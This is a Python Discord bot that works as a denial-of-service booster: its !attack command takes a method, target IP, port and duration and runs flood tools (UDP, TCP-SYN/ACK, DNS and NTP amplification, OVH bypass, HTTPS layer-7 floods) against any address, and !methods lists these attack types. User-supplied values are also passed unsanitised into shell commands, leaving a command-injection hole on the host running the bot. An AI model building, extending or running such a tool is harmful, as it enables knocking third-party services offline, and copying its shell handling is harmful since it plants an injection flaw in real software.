import os
import discord
from discord.ext import commands
import asyncio

TOKEN = os.getenv('KEYS')
if not TOKEN:
    print("ERROR: No se ha encontrado el token de Discord")
    exit(1)

BOT_PREFIX = '!'
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents)

@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user.name}')
    await bot.change_presence(activity=discord.Game(name="Atacando con UDP"))

async def ejecutar_ataque(comando: str, ctx, ip: str, port: int, tiempo: int):
    try:
        proceso = await asyncio.create_subprocess_shell(
            comando,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proceso.communicate()

        try:
            await ctx.send(f"Attack {ip}:{port} finished {tiempo}")
        except:
            pass

        print(f"Ataque '{comando}' terminado")
    except Exception as e:
        print(f"Error: {e}")
        try:
            await ctx.send(f'Error: {e}')
        except:
            pass

@bot.command(name='attack', help='!attack {method} {ip} {port} {time}')
async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiempo: str = None, *, payload: str = None):
    if metodo is None or ip is None or port is None or tiempo is None:
        await ctx.send("!attack {method} {ip} {port} {time}")
        return

    if ip == "null" or port == "null" or tiempo == "null":
        await ctx.send("Falta la IP, Puerto o Tiempo")
        return

    try:
        port_int = int(port)
        tiempo_int = int(tiempo)
    except:
        await ctx.send("Puerto y tiempo deben ser números")
        return

    if port_int < 1 or port_int > 65535:
        await ctx.send("Puerto no valido")
        return

    if tiempo_int <= 0:
        await ctx.send("El tiempo debe ser mayor a 0")
        return

    comando = None

    if metodo == 'udp':
        comando = f'./udp {ip} {port_int} -t 32 -s 64 -d {tiempo_int}'
        await ctx.send(f'Successful Attack UDP TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')

    elif metodo == 'udphex':
        comando = f'./udphex {ip} {port_int} {tiempo_int}'
        await ctx.send(f'Successful Attack UDPHEX TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')

    elif metodo == 'udppps':
        comando = f'./udppps {ip} {port_int} {tiempo_int}'
        await ctx.send(f'Successful Attack UDPpps TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')

    elif metodo == 'udpflood':
        comando = f'go run udpflood.go {ip} {port_int} {tiempo_int}'
        await ctx.send(f'Successful Attack UDPFlood TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')

    elif metodo == 'ovh':
        comando = f'sudo ./ovh {ip} {port_int} 20 -1 {tiempo_int}'
        await ctx.send(f'Successful Attack OVH TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')

    elif metodo == 'udppayload':
        if payload is None or payload == "null":
            await ctx.send("Falta el payload")
            return

        if len(payload) > 1024:
            await ctx.send("Payload maximo 1024 bytes")
            return

        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
            f.write(payload)
            temp_file = f.name

        comando = f'./udppayload {ip} {port_int} {tiempo_int} "{temp_file}"'
        await ctx.send(f'Successful Attack UDPPayload TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int} Payload:{len(payload)}')

    elif metodo == 'raknet':
        comando = f'go run raknet.go {ip} {port_int} {tiempo_int}'
        await ctx.send(f'Successful Attack RakNet TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')

    elif metodo == 'udpbypass':
        comando = f'./udpbypass {ip} {port_int} {tiempo_int}'
        await ctx.send(f'Successful Attack UDPBypass TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')

    elif metodo == 'tcp':
        comando = f'./tcp {ip} {port_int} {tiempo_int}'
        await ctx.send(f'Successful Attack TCP TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')

    elif metodo == 'tcp-syn':
        comando = f'./tcp-syn {ip} {port_int} {tiempo_int}'
        await ctx.send(f'Successful Attack TCP-SYN TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')

    elif metodo == 'tcp-ack':
        comando = f'./tcp-ack {ip} {port_int} {tiempo_int}'
        await ctx.send(f'Successful Attack TCP-ACK TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')

    elif metodo == 'tcp-tls':
        comando = f'./tcp-tls {ip} {port_int} {tiempo_int}'
        await ctx.send(f'Successful Attack TCP-TLS TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')

    elif metodo == 'dns':
        comando = f'./dns {ip} {port_int} {tiempo_int}'
        await ctx.send(f'Successful Attack DNS TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')

    elif metodo == 'ntp':
        comando = f'./ntp {ip} {port_int} {tiempo_int}'
        await ctx.send(f'Successful Attack NTP TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')

    elif metodo == 'https-raw':
      comando = f'./httpsraw {ip} {port_int} {tiempo_int}'
      await ctx.send(f'Successful Attack HTTPs-Raw TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')

    elif metodo == 'tls':
        comando = f'./tls {ip} {port_int} {tiempo_int}'
        await ctx.send(f'Successful Attack TLS TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')

    elif metodo == 'https-request':
        comando = f'./httpsrequest {ip} {port_int} {tiempo_int}'
        await ctx.send(f'Successful Attack HTTPs-Request TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')

    else:
        await ctx.send('Método no encontrado, usa !methods')
        return

    try:
        if comando:
            asyncio.create_task(ejecutar_ataque(comando, ctx, ip, port_int, tiempo_int))
    except Exception as e:
        await ctx.send(f'Error: {e}')

@bot.command(name='methods')
async def show_methods(ctx):
    methods_info = """
Methods L4 UDP Protocol:
• udp
• udphex
• udppps
• udpflood
• udppayload
• udpbypass
• raknet

Methods L4 TCP Protocol:
• tcp
• tcp-syn
• tcp-ack
• tcp-tls

Methods AMP:
• dns
• ntp

Methods L7:
• https-raw
• tls
• https-request
"""
    await ctx.send(methods_info)

bot.run(TOKEN)
